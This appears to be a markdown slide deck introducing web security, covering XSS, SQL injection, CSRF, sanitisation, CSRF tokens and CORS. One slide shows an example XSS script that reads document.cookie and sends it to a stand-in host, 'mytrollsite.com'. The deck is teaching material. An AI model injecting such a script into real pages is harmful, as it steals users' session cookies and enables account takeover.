#Web Security

---

#Top 3 most common security vulnerabilities on the web

 - Cross Site Scripting
 - SQL Injection
 - CSRF

---

#Cross Site Scripting - XSS

![inline](http://excess-xss.com/reflected-xss.png)

---

XSS is a concern if you allow user's to provide input that is then rendered within the context of your page.

```
<script>
  var yerCookies = document.cookie;
  var url = "mytrollsite.com/" + yerCookies;
  var oReq = new XMLHttpRequest();
  oReq.open("get", url, true);
  oReq.send();
</script>
```

---

# Sanitize your inputs
 - Blacklist, whitelist, escaping

![inline](https://camo.githubusercontent.com/1cd74d6cf2b835adc1c592f855b7e93bf32a296d/68747470733a2f2f662e636c6f75642e6769746875622e636f6d2f6173736574732f3736343638382f313532373431322f64376134353865322d346266342d313165332d393663332d6166396135646639373063312e706e67)

---

#SQL Injection

![inline](./sql-injection.png)

---

#CSRF attack

- using a session or cookie set on another page
- to make a request from another site.


---

![fit](cookieset.png)

---

![fit](insert.png)

---

![fit](insertion.png)

---

![fit](Hacked.png)

---

#CSRF Tokens reduces CSRF

![inline](https://cdn.tutsplus.com/net/uploads/legacy/965_csrfCI/flowchart.png)

---

#Think about the source of the request (CORS)

![inline](http://software.dzhuvinov.com/files/cors/cors-context.jpg)

  - but not all since requests are made from the browser

